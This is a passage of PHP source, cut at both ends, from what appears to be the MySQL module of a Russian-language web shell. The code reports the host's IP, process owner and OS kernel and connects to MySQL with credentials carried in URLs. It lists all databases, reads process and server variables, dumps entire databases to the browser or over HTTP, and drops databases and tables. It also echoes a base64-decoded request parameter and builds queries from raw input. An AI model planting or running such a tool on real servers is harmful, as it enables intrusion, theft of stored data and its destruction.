'hw4cQI0qcSLGixYsOB8A5UKYAxooQJDB4oAChQoYNBfgzEIeAvwQNzcg0w3KASzhmBrQ0A2CjTgJm4pShac'.
'BMmThmCAg1OnQmgaEsIwLteeDnyzg9AwCA2fCmgAFFZ8pUGkdAzoYhR5ZMuLChgQMA/xDgjAP3ZhwD/Q7MV'.
'UlAJYI4/QjohdkPKZwBPcvgRVCgXxmg/Yyq9Bgx8GC6AOz66/dXLgK+QyNDFgrnL1qRJE22bTggQBk4AOK0'.
'7gmHdAKNAPAKCBAAZ2MBcXoD+A249uTXCfTCYUm8OIDhD4kLl621n8acGuE0n1s8ZW0z2h2mTc0WJWmfrzf'.
'OvWmdtj8Er2P3ThCfeGGXB5Q3jC97c22H/M2Xnl5mTGdYAnAcBVhQ1zWUWGkPjbfWSRC95gQcwE0HXnXPJf'.
'hQVi0tl1V8DYK3HHcgTqfXh3AEEKIIGAYHm4E4gYicjLGdF554qE24WoIBqCQFhgHodVQ/AKhUxv9rHJUhQ'.
'FEJvhYUeJAhIFdsjvVGFng69SSAS0E5BN6SOPW2m5HZBRllaWXo5VFiDfUGYYQ9qsYQXv585V8BeAbWkFz+'.
'FOePR/75o1iMCCpYWFmbRdXQntkNipU/OSq3nHeO9kMZj2rZ6RBvlLWmk0UFBMAchqV+pCpEv6XKWgCjOlR'.
'qrHe5ONFrptHZaXmrWsRfr8D+CqxF/TjKKUkv5MCCDiWc4eyz0EYrrbQZVGDBtNhmq62z1V677bfSWlDBEd'.
'OGQMMXHvAAhBA3pKCFGvDGK++89NZr77345qvvvvzKywQGIFjxxgk9QFEDBm0krPDCDDfs8MMQRyzxxBRXv'.
'DArCDa8oXEIF3ShgBgahyzyyCSXbPLJKKes8soso3wBGU20LPPMNNdsc8qBAAA7';

send_header();
echo base64_decode($b_close);
} 

$n_img = create_function('$tag,$f_n,$img_c', 'print \'<\'.$tag.\'>\';$f_n("$img_c");');
$h_error="<br><table align=center width=500 height=70 bgcolor=red><b>Ошибка в запросе:</b><tr><td align=center><br><h5>";
$f_error="</h5></td></tr></table>
<CENTER><FORM><INPUT type=\"button\" value=\"   << Назад    \" onClick=\"history.go(-1)\"><BR>
</FORM></CENTER>

</td></tr></table></td></tr></table>
<table align=center width=100% cellpadding=0 cellspacing=1 bgcolor=#181818>
<tr><td>
<table align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#181818>
</table> 
</td></tr>
</table>
</td></tr></table>";
print "
<html><HEAD><TITLE>MySQL</TITLE>
<META http-equiv=Content-Type Pragma: no-cache; content=\"text/html; charset=windows-1251\">
".$mainmenu."</HEAD><BODY bgcolor=#181818 text=#ffffff onLoad=\"writeMenus()\" onResize=\"if (isNS4) nsResizeHandler()\"><br>";
if ($sapi_type == "cgi") {
$php_type="CGI";
} else {
$php_type="модуль";
}
$start_form="<br>
<table align=center border=0 width=100% cellpadding=2 cellspacing=0 bgcolor=#181818>
<tr>
<td>
<table align=center width=80% cellpadding=0 cellspacing=1 bgcolor=#181818>
<tr><td>
<table border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#181818>
<tr>
<td width=25>
&nbsp;
</td>
<td>
<font size=4><b>MySQL</b></font>
</td>
<td width=33% align=right>
".date ("j F- Y- g:i")."&nbsp;&nbsp;
</td>
</tr>
</table> 
</td></tr>
</table>
</td></tr>
<tr><td>
<table align=center border=0 width=80% cellpadding=2 cellspacing=0 bgcolor=#181818>
<tr>
<td bgcolor=#181818 valign=top width=200><br>
<center><b>Утилита для работы с MySQL</b></center><hr width=98%>
<li>Просмотр баз и таблиц.
<li>Произвольные запросы к БД.
<li>Редактирование баз и таблиц.
<li>Дампы БД или таблиц.<hr width=98%>
</td>
<td bgcolor=#181818><center><font size=2>
<br>Для соединения с сервером MySQL введите <b>ИМЯ</b>, <b>ПАРОЛЬ</b> (пользователя MySQL) и имя <b>ХОСТА</b>.</font></center><br>
<li>Если логин юзера mysql не указан явно, по умолчанию подставляется имя владельца процесса.
<li>Если пароль юзера mysql не указан явно, по умолчанию подставляется пустой пароль.
<li>Если имя севрвера mysql не указано явно, по умолчанию подставляется <b>localhost</b>
<li>Если порт для севрвера mysql не указан явно, подставляется  порт по умолчанию, обычно (<b>3306</b>)<br><br>
<center>Версия PHP (<b>".phpversion()."</b>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ID PHP script (<b>".get_current_user( )."</b>)</center>
<br><table align=center>
<tr><td>имя юзера MySQL</td><td align=right>пароль юзера MySQL&nbsp;</td></tr>
<form method=\"get\" action=\"$self\">
<input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">
<input type=\"hidden\" name=\"s\" value=\"y\">
<tr>
<td><input type=\"text\" name=\"login\" value=\"root\" maxlength=\"64\"></td>
<td align=right><input type=\"text\" name=\"passwd\" value=\"$passwd\" maxlength=\"64\"></td>
</tr>
<tr><td>Сервер MySQL</td><td>порт</td></tr>
<tr>                
<td><input type=\"text\" name=\"server\" value=\"localhost\" maxlength=\"64\"></td>
<td><input type=\"text\" name=\"port\" value=\"3306\" maxlength=\"6\" size=\"3\">
<input type=\"submit\" value=\"подключиться\"></td>
</tr></table><br>        
</td>
</tr>
</table>
</td></tr>
<tr><td>
<table align=center width=80% cellpadding=0 cellspacing=1 bgcolor=#181818>
<tr><td>
<table align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#181818>
</table> 
</td></tr>
</table>
</td></tr></table>
";
if ($os =='win') {
$os="OS- <b>".$HTTP_ENV_VARS["OS"]."</b>";
}else{
$str_k=$_ENV["BOOT_FILE"];
$k=preg_replace ("/[a-zA-Z\/]/","", $str_k);
$os="OS\Kernel: <b>".$_ENV["BOOT_IMAGE"].$k."</b>";
}

if (!isset($s) || $_REQUEST[s] != 'y') { print $start_form;
$serv = array(127,192,172,10);
$adrr=@explode('.', $HTTP_SERVER_VARS["SERVER_ADDR"]);
if (!in_array($adrr[0], $serv)) {
}

exit;
}

$form_ad_b="<br>
<table width=80% align=center border=0 cellpadding=0 cellspacing=1 bgcolor=#181818> 
<tr>
<td>
<table width=100% align=center border=0 cellpadding=4 cellspacing=0 bgcolor=#181818> 
<td>
MySQL <b>$server</b> v.(<b>".mysql_get_server_info()."</b>)
</td>
<td align=center>
<b>".$HTTP_SERVER_VARS["SERVER_SOFTWARE"]."</b>
</td>
<td align=right>
Версия PHP (<b>".phpversion()."</b>) $php_type
</td>
</tr>
<tr bgcolor=#181818>
<td>
IP:<b>".$HTTP_SERVER_VARS["SERVER_ADDR"]."</b> Name:<b>".$HTTP_SERVER_VARS["SERVER_NAME"]."</b>
</td>
<td align=center>
ID PHP script (<b>".get_current_user( )."</b>)
</td>
<td align=right>
$os
</td>
</tr>
</table>
</td></tr></table>
<table width=80% align=center border=0 cellpadding=5 cellspacing=1> 
<tr>
<td>
<a href=\"$self?sec=mysql&workingdir=".getcwd()."&s=$s&stat=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\"><b>Статистика MySQL</b></a>
</td>
<td align=right>
<a href=\"$self?sec=mysql&workingdir=".getcwd()."&s=$s&proc=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\"><b>Процессы MySQL </b></a>
</td>
<td align=center>
&nbsp;
</td>
</tr>
<tr>
<td>
<a href=\"$self?sec=mysql&workingdir=".getcwd()."&s=$s&apc=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\"><b>Переменные Apache </b></a>
</td>
<td align=right>
<a href=\"$self?sec=mysql&workingdir=".getcwd()."&s=$s&var=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\"><b>Переменные MySQL </b></a> 
</td>
<td align=center>
&nbsp;
</td>
</tr>
</table><br>
<table width=300 align=center cellpadding=0 cellspacing=1 bgcolor=#181818>
<tr bgcolor=#181818><td>
<table align=center cellpadding=0 cellspacing=0>
<tr bgcolor=#181818>
<td> <table cellpadding=4><tr><td><b>Создать новую базу данных</b></td></tr><tr><td>
<form method=\"get\" action=\"$self\">
<input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">
<input type=\"hidden\" name=\"s\" value=\"$s\">
<input type=\"hidden\" name=\"server\" value=\"$server\">
<input type=\"hidden\" name=\"port\" value=\"$port\">
<input type=\"hidden\" name=\"login\" value=\"$login\">
<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">
<input type=\"text\" name=\"new_db\" value=\"\" maxlength=\"64\">
<input type=\"submit\" value=\"создать\"></td>
</tr></table>
</td>
</tr>
</table>
</td>    
</tr></table></form>
<table width=80% align=center border=0 cellpadding=0>
<tr align=right>
<td width=85%></td>
<td width=15>
<a href=$self><img src=".$self."?sec=mysql&workingdir=".getcwd()."&img=b_close border=0 title=close></a>
</td>
</tr>
</table>
";
$cnt_b=mysql_num_rows(mysql_list_dbs());
print "
<table align=center border=0 width=100% cellpadding=1 cellspacing=0 bgcolor=#181818>
<tr>
<td>
<table align=center width=100% cellpadding=0 cellspacing=1 bgcolor=#181818>
<tr><td>
<table border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#181818>
<tr>
<td>
&nbsp;
</td>
<td width=33%>
<font size=4><b>MySQL</b></font>
</td>
<td width=33% align=center>
<font color=blue><b>$server</b></font>&nbsp;[CONNECTION Ok] &nbsp;&nbsp;Всего баз: <b>$cnt_b</b>
</td>
<td width=33% align=right>
".date ("j F- Y- g:i")."&nbsp;&nbsp;
</td>
</tr>
</table> 
</td></tr>
</table>
</td></tr>
<tr><td>
<table align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#181818>
<tr>
<td bgcolor=#181818 valign=top width=170>";
if (isset($server)&&isset($port)&&isset($login)&&isset($passwd)){
$connection = mysql_connect($server.":".$port, $login, $passwd) or die("$header<table align=center width=80% bgcolor=red><tr><br>Ошибка соединения с MySQL сервером <b>$server</b><td><center><font size=2><b>".mysql_error()."</b></font></center><br><b>Вероятные ошибки:</b><li>Не правильный адрес сервера <b>$server</b><li>Не правильный номер порта <b>$port</b><li>Не верное имя (login) юзера mysql <b>$login</b><li>Не верный пароль (password) юзера mysql <b>$passwd</b><li>Доступ к серверу $server запрещен с адреса <b>".getenv('REMOTE_ADDR')."</b><li>Удаленный сервер временно не доступен</td></tr></table><br></td></tr></table><script>alert('Не возможно установить соединение с MySQL сервером $server \\n\\n Проверьте правильность входящих данных:\\n\\nсервер $server\\nпорт $port\\nимя $login\\nпароль $passwd');</script><head><META HTTP-EQUIV='Refresh' CONTENT='3;url=$self'></head>");
}

if ($connection&&!isset($db)) {
print "<table border=0 cellpadding=0 cellspacing=1 width=100% bgcolor=#181818><tr><td bgcolor=#181818 align=center>".
"<a href=\"$self?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"Вернуться в начало и обновить список баз\"><font color=green><b>".
"Показать&nbsp;все&nbsp;базы</b></font></a></td></tr></table>";
$result = mysql_list_dbs($connection) or die("$h_error<b>".mysql_error()."</b>$f_error");
while ( $row=mysql_fetch_row($result) ){
$cnt_title=mysql_num_rows(mysql_list_tables($row[0]));
print "<table valign=top border=0 width=100% cellpadding=0 cellspacing=1 bgcolor=#181818><tr><td bgcolor=#181818>";

if ($cnt_title < 1) {
print "<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&db=$row[0]&cr_tbl=new&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"Всего таблиц $cnt_title\"><b>$row[0]</b></a>";
}else{
print "<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&db=$row[0]&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"Всего таблиц $cnt_title\"><b>$row[0]</b></a>";
}
print "</td></tr></table>";
}
}
if (isset($db)){          
$result=mysql_list_tables($db) or die ("$h_error<b>".mysql_error()."</b>$f_error<head><META HTTP-EQUIV='Refresh' CONTENT='5;url=$self?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port'></head>");
print "<table border=0 cellpadding=0 cellspacing=1 width=100% bgcolor=#181818><tr><td bgcolor=#181818 align=center>".
"<a href=\"$self?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port\"><font color=green><b>".
"Показать&nbsp;все&nbsp;базы</b></font></a></td></tr><tr><td></td></tr><tr><td></td></tr></table>";
print "<table cellpadding=0 cellspacing=1 width=100% bgcolor=#181818><tr><td bgcolor=#181818 align=center>".
"---[ <a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db\" title=\"обновить список таблиц\"><b>$db</b></a>".
" ]---</a></td></tr><tr><td></td></tr><tr><td></td></tr></table>";
while ( $row=mysql_fetch_array($result) ){
$count=mysql_query ("SELECT COUNT(*) FROM $row[0]");
$count_row= mysql_fetch_array($count);
print "<table valign=top border=0 width=100% cellpadding=0 cellspacing=1 bgcolor=#181818>".
"<tr><td bgcolor=#181818>";
if ($count_row[0] < 1) { 
print "<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$row[0]&nn_row=ok\">$row[0]</a>&nbsp;($count_row[0])</td></tr></table>";  
}else{
print "<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&tbl=$row[0]&limit_start=0&limit_count=5\">$row[0]</a>&nbsp;($count_row[0])</td></tr></table>";  
}
@mysql_free_result($count);
}
} 
print "
</td>
<td valign=top bgcolor=#181818>";
if ($connection&&!isset($db)) { 
$anon = @mysql_query("SELECT Host,User FROM mysql.user WHERE User=''", $connection); 
if (mysql_num_rows($anon)>0) { print "<table align=center><tr><td><b>Внимание!<b></td></tr><tr><td bgcolor=red>Анонимным пользователям разрешено подключение к серверу MySQL</td></tr></table>"; }
print $form_ad_b; 
}

if (isset($proc) && $proc=="TRUE"){
$result = mysql_query("SHOW PROCESSLIST", $connection); 
print "<center><font size=2>Процессы MySQL сервера [ <b>$server</b> ]</font><center><table align=center border=0 cellpadding=0 cellspacing=1 width=80% bgcolor=#181818><tr align=center bgcolor=#181818><td>ID</td><td>USER</td><td>HOST</td><td>DB</td><td>COMMAND</td><td>TIME</td><td>STATE</td><td>INFO</td></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
print "<tr bgcolor=#181818><td>$row[0]</td><td>$row[1]</td><td>$row[2]</td><td>$row[3]</td><td>$row[4]</td><td>$row[5]</td><td>$row[6]</td><td>$row[7]</td></tr>";  
} 

print "</table><br>";
mysql_free_result($result);
unset($proc);
}

if (isset($_REQUEST['new_db'])){
$new_db=trim($_REQUEST['new_db']);
if (mysql_create_db ($new_db)) {
print ("<center><font size=2>База <b>$new_db</b> успешно создана</font></center><br>");
print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port'></head>";
} else {
print "$h_error".mysql_error()."$f_error <head><META HTTP-EQUIV='Refresh' CONTENT='5;url=$self?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port'></head>";
}

unset($new_db);
}

if (isset($_REQUEST['drop'])){
$result_d = mysql_list_dbs($connection) or die("<td bgcolor=#181818>$h_error".mysql_error()."$f_error</td></tr></table>");
while ( $row_d=mysql_fetch_row($result_d) ){
if ($drop==$row_d[0]) $dr="TRUE";
}

if ($dr="TRUE") { 
mysql_drop_db($drop,$connection);
print ("<center><font size=2>База <b>$drop</b> успешно удалена</font></center><br>");
print "<head><META HTTP-EQUIV='Refresh' CONTENT='0;url=$self?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port'></head>";
}

unset($drop);
}

if (isset($apc) && $apc=="TRUE"){
print "<center><font size=2>Переменные сервера Apache [ <b>$server</b> ]</font><center>
<table align=center border=0 cellpadding=0 cellspacing=1 width=80% bgcolor=#181818>
<tr align=center bgcolor=#181818>
<td>Описание</td><td>Переменная</td>
</tr> 
<tr bgcolor=#181818><td>Имя Internet-хоста</td><td>".$HTTP_SERVER_VARS["SERVER_NAME"]."</td></tr>
<tr bgcolor=#181818><td>IP-адрес хоста</td><td>".$HTTP_SERVER_VARS["SERVER_ADDR"]."</td></tr>
<tr bgcolor=#181818><td>Порт Web-сервера.</td><td>".$HTTP_SERVER_VARS["SERVER_PORT"]."</td></tr>
<tr bgcolor=#181818><td>Спецификация CGI интефейса.</td><td>".$HTTP_SERVER_VARS["GATEWAY_INTERFACE"]."</td></tr>
<tr bgcolor=#181818><td>Протокол при запросе данной страницы (метод).</td><td>".$HTTP_SERVER_VARS["REQUEST_METHOD"]."</td></tr>
<tr bgcolor=#181818><td>Root директория для данного пользователя.</td><td>".$HTTP_SERVER_VARS["DOCUMENT_ROOT"]."</td></tr>
<tr bgcolor=#181818><td>Заголовок текущего запроса.</td><td>".$HTTP_SERVER_VARS["HTTP_CONNECTION"]."</td></tr>
<tr bgcolor=#181818><td>Директива httpd.conf (SERVER_ADMIN).</td><td>".$HTTP_SERVER_VARS["SERVER_ADMIN"]."</td></tr>
<tr bgcolor=#181818><td>Сигнатура сервера.</td><td>".$HTTP_SERVER_VARS["SERVER_SIGNATURE"]."</td></tr>
</table><br>";

unset($apc);
}

if (isset($stat) && $stat=="TRUE"){
$result = mysql_query("SHOW STATUS", $connection); 
print "<center><font size=2>Переменные состояния MySQL сервера [ <b>$server</b> ]</font><center><table align=center border=0 cellpadding=0 cellspacing=1 width=400 bgcolor=#181818><tr align=center bgcolor=#181818><td>Переменные состояния сервера</td><td>значения переменных</td></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
print "<tr bgcolor=#181818><td>$row[0]</td><td>$row[1]</td></tr>";  
} 

print "</table>";
mysql_free_result($result);
}

if (isset($var) && $var=="TRUE"){
$result = mysql_query("SHOW VARIABLES ", $connection); 
print "<center><font size=2>Системные переменные MySQL сервера [ <b>$server</b> ]</font><center><table align=center border=0 cellpadding=0 cellspacing=1 width=80% bgcolor=#181818><tr align=center bgcolor=#181818><td>Переменные сервера</td><td>значения переменных</td></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
print "<tr bgcolor=#181818><td>$row[0]</td><td>$row[1]</td></tr>";  
} 

print "</table>";
mysql_free_result($result);
unset($var);
}

if (isset($db) && !isset($tbl)) {
$cnt=mysql_num_rows(mysql_list_tables($db));
print "<table border=0 align=center width=100% cellpadding=0 cellspacing=0>
<tr>
<td>
<table border=0 align=center width=80% cellpadding=0 cellspacing=1 bgcolor=#181818>
<tr align=center>                      
<td width=20% bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&cr_tbl=new\" title=\"Создать новую таблицу в базе $db\"><b>Создать таблицу</b></a>
</td>
<td width=20% bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&login=$login&passwd=$passwd&server=$server&port=$port&query_tbl&q_tbl=bd\" title=\"Произвольный запрос к базе\"><b>SQL-запрос</b></a>
</td>
<td width=20% bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&str=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"Показать структуру БД\"><b>структура</b></a>
</td>
<td width=20% bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&dump=bd\" title=\"Экспорт данных базы $db\"><b>Дамп базы</b></a>
</td>
<td width=20% bgcolor=#181818>
<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&drop=$db&login=$login&passwd=$passwd&server=$server&port=$port\" title=\"Удалить БД $db\" onClick=\"return confirm('Удалить базу $db ?')\";><b>удалить базу</b></a>
</td>
</tr> 
</table> 
</td>
</tr>
<tr>
<td><br>";

print "&nbsp;&nbsp;БД:(<b>$db</b>)  &nbsp;&nbsp;Всего таблиц:(<b>$cnt</b>)";
if (isset($t)) { print "<br>&nbsp;&nbsp;";}
if (isset($t2)) { print base64_decode($t2);}
if (isset($str) && $str=='TRUE'){
mysql_select_db($db);
if ($cnt < 1) { 
print "<table border=1 width=400 align=center bgcolor=#181818><tr align=center>".
"<td><br><h5>Невозможно показать структуру базы<br>В базе <font color=blue>".
"$db</font> нет таблиц!</h5></td></tr></table><br><br>";     
}else{
$result = mysql_query("SHOW TABLE STATUS", $connection); 
print "<br><center><font size=2>Структура базы [ <b>$db</b> ]</font></center>".
"<table align=center border=0 cellpadding=0 cellspacing=1 width=650 bgcolor=#181818>".
"<tr align=center bgcolor=#181818><td>имя таблицы</td><td>тип</td><td>рядов</td><td>создана</td>".
"<td>модифицирована</td><td>размер(kb)</td><td>действие</td></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {
$size=$row[5]/1000;
print "<tr bgcolor=#181818><td>$row[0]</td><td>$row[1]</td><td align=center>$row[3]</td>".
"<td>$row[10]</td><td>$row[11]</td><td align=center>$size</td><td bgcolor=red align=center>".
"<a href=\"$_SERVER[PHP_SELF]?sec=mysql&workingdir=".getcwd()."&s=$s&db=$db&login=$login&passwd=$passwd&server=$server&".
"port=$port&drop_table=$row[0]\" onClick=\"return confirm('Удалить таблицу $row[0]?')\";>уничтожить</a></td>
</tr>";  
} 

print "</table><br>";
mysql_free_result($result);
}
} 

print "</td>
</tr>
</table>";
}

$form_dump_bd=
"<form method=\"get\" action=\"$self\">".
"<input type=\"hidden\" name=\"s\" value=\"$s\"><input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">".
"<input type=\"hidden\" name=\"db\" value=\"$db\">".
"<input type=\"hidden\" name=\"server\" value=\"$server\">".
"<input type=\"hidden\" name=\"port\" value=\"$port\">".
"<input type=\"hidden\" name=\"login\" value=\"$login\">".
"<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".
"<input type=\"hidden\" name=\"f_dump\" value=\"$file\">".
"<input type=\"hidden\" name=\"dump\" value=\"bd\">".
"<input type=\"hidden\" name=\"strukt\" value=\"d_strukt_bd\">".
"<table align=center bgcolor=#181818 width=400 cellpadding=0 cellspacing=1 border=0><tr bgcolor=#181818><td valign=top>".
"<table cellpadding=2 bgcolor=#181818 width=100%>".
"<tr><td align=center><b>Dump базы</b> [ <font color=green><b>$db</b></font> ]</td></tr>".
"<tr><td align=center><font color=gray><b>Структура и данные</b></font></td></tr>".
"<tr><td align=center><hr size=1 color=#FFFFFF><b>Действие</b> (показать/отправить)</td></tr>".
"<tr><td><input type=\"radio\" name=\"send\" value=\"send_br\" checked=\"checked\"> Показать в броузере</td></tr>".
"<tr><td><input type=\"radio\" name=\"send\" value=\"send_http\"> Отправить файл дампа по HTTP</td></tr>".
"<tr><td align=center><br><input type=\"submit\" value=\"Выполнить запрос\"></td></tr>".
"</table>".
"</td></tr></table></form>";

if ($_REQUEST['dump']=='bd') {
if ($cnt >= 1) {
print $form_dump_bd;
}else{ 
print "<table border=1 width=400 align=center bgcolor=#181818><tr align=center>".
"<td><br><h5>Невозможно сделать дамп базы<br>В базе <font color=blue>".
"$db</font> нет таблиц!</h5></td></tr></table><br><br>";
}
}

$host = $HTTP_SERVER_VARS["SERVER_NAME"];
$ip = $HTTP_SERVER_VARS["SERVER_ADDR"];
if ($_REQUEST['strukt']=='d_strukt_bd' && $_REQUEST['send']=='send_br'){
if (sizeof($tabs) == 0) { 
$res = mysql_query("SHOW TABLES FROM $db", $connection); 
if (mysql_num_rows($res) > 0) { 
while ($row = mysql_fetch_row($res)) { 
$tabs[] .= $row[0]; 
} 
} 
} 

$fp = fopen($file, "w"); 
fputs ($fp, "# Host settings:\n# MySQL version: (".mysql_get_server_info().")\n# Date: ".
date("F j, Y, g:i a")."\n# ".$host." (".$ip.")"." dump db \"".$db."\"\n#____________________________________________________________\n\n"); 
foreach($tabs as $tab) {       
if ($add_drop) { 
fputs($fp, "DROP TABLE IF EXISTS `".$tab."`;\n");
}        

$res = mysql_query("SHOW CREATE TABLE `".$tab."`", $connection) or die(mysql_error()); 
$row = mysql_fetch_row($res); 
fputs($fp, $row[1].";\n\n"); 
$res = mysql_query("SELECT * FROM `$tab`", $connection); 
if (mysql_num_rows($res) > 0) { 
while ($row = mysql_fetch_assoc($res)) { 
$keys = implode("`, `", array_keys($row)); 
$values = array_values($row); 
foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
$values = implode("', '", $values); 
$sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n"; 
fputs($fp, $sql); 
} 
} 
fputs ($fp, "#---------------------------------------------------------------------------------\n\n"); 
} 
fclose($fp);
$dump_file=file($file);
print "<table border=1 align=center cellpadding=2 bgcolor=#181818 width=98%><tr><td>";
print "<table border=0 align=center cellpadding=2 bgcolor=#181818>";
foreach ($dump_file as $k=>$v) {
$v=str_replace("\n","<br>",$v);
print "<tr><td>".strip_tags($v,"<br>")."</td></tr>";
}

print "</table></td></tr></table><br>";
unlink($file);
} 

$form_cr_tbl=
"<form method=\"get\" action=\"$self\">".
"<input type=\"hidden\" name=\"s\" value=\"$s\"><input type=hidden name=sec value=mysql>
<input type=hidden name=workingdir value=".getcwd().">".
"<input type=\"hidden\" name=\"db\" value=\"$db\">".
"<input type=\"hidden\" name=\"server\" value=\"$server\">".
"<input type=\"hidden\" name=\"port\" value=\"$port\">".
"<input type=\"hidden\" name=\"login\" value=\"$login\">".
"<input type=\"hidden\" name=\"passwd\" value=\"$passwd\">".
"<table align=center bgcolor=#181818 width=400 cellpadding=0 cellspacing=1 border=0><tr bgcolor=#181818><td valign=top>".
"<table cellpadding=2 bgcolor=#181818 width=100%>".
"<tr><td align=center><b>Создать новую таблицу в базе</b> [ <font color=green><b>$db</b></font> ]<hr color=#181818></td></tr>".
"<tr><td align=center>Имя новой таблицы: <input type=\"text\" name=\"new_tbl_name\" value=\"\" size=25></td></tr>".
"<tr><td align=center>Количество полей таблицы:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"text\" name=\"new_count_cols\" value=\"\" size=10></td></tr>".
"<tr><td align=center><br><input type=\"submit\" value=\"Выполнить запрос\"></td></tr>".
"</table>".
"</td></tr></table></form>";

if (isset($_REQUEST['cr_tbl']) && $_REQUEST['cr_tbl']=='new'){
print "$form_cr_tbl";   
}

if ( (isset($new_count_cols)) && (ereg("[^0-9]",$new_count_cols) || preg_match("/ +/",$new_count_cols) || $new_count_cols=='') ) { 
print "<script>alert('Количество полей таблицы - это число, а не что-то иное!');</script>";
print "$form_cr_tbl";   
}  

if ( (ereg("[0-9]",$_REQUEST['new_count_cols'])) && ($_REQUEST['new_tbl_name'] !=='') ) {
for ($i=0; $i < $_REQUEST['new_count_cols']; $i++) {
$pole_count .= "<tr align=center bgcolor=#181818>".
"<td><input type=\"text\" name=\"field_name[]\" size=\"10\" value=\"\"></td>".
"<td>
<select name=\"field_type[]\" width=3>
<option value=\"VARCHAR\">VARCHAR</option>
<option value=\"TINYINT\">TINYINT</option>
<option value=\"TEXT\">TEXT</option>
<option value=\"DATE\">DATE</option>
<option value=\"SMALLINT\">SMALLINT</option>
<option value=\"MEDIUMINT\">MEDIUMINT</option>
<option value=\"INT\">INT</option>
<option value=\"BIGINT\">BIGINT</option>
<option value=\"FLOAT\">FLOAT</option>
<option value=\"DOUBLE\">DOUBLE</option>
<option value=\"DECIMAL\">DECIMAL</option>
<option value=\"DATETIME\">DATETIME</option>
<option value=\"TIMESTAMP\">TIMESTAMP</option>
<option value=\"TIME\">TIME</option>
<option value=\"YEAR\">YEAR</option>
<option value=\"CHAR\">CHAR</option>
<option value=\"TINYBLOB\">TINYBLOB</option>
<option value=\"TINYTEXT\">TINYTEXT</option>
<option value=\"BLOB\">BLOB</option>
<option value=\"MEDIUMBLOB\">MEDIUMBLOB</option>
<option value=\"MEDIUMTEXT\">MEDIUMTEXT</option>
<option value=\"LONGBLOB\">LONGBLOB</option>
<option value=\"LONGTEXT\">LONGTEXT</option>
<option value=\"ENUM\">ENUM</option>
<option value=\"SET\">SET</option>
</select>
</td>".
"<td><input type=\"text\" name=\"field_length[]\" size=\"6\" value=\"\"></td>".
"<td>
<select name=\"field_attribute[]\">    
<option value=\"\" selected=\"selected\"></option>
<option value=\"BINARY\">BINARY</option>
<option value=\"UNSIGNED\">UNSIGNED</option>
<option value=\"UNSIGNED ZEROFILL\">UNS-D ZEROFILL</option>
</select>
</td>".
"<td>
<select name=\"field_null[]\">   
<option value=\"NOT NULL\">not null</option>
<option value=\"\">null</option>
</select>
</td>".
"<td><input type=\"text\" name=\"field_default[]\" size=\"14\" value=\"\"></td>".
"<td>
<select name=\"field_extra[]\">
<option value=\"\"></option>
<option value=\"AUTO_INCREMENT\">auto_increment</option>
</select>
</td>".
"<td align=\"center\"><input type=\"radio\" name=\"field_key_0[$i]\" value=\"primary_0\"></td>".
"<td align=\"center\"><input type=\"radio\" name=\"field_key_0[$i]\" value=\"index_0\"></td>".
"<td align=\"center\"><input type=\"radio\" name=\"field_key_0[$i]\" value=\"unique_0\"></td>".
"<td align=\"center\"><input type=\"radio\" name=\"field_key_0[$i]\" value=\"no\" checked=\"checked\"></td>".
"</tr>";
}

print 
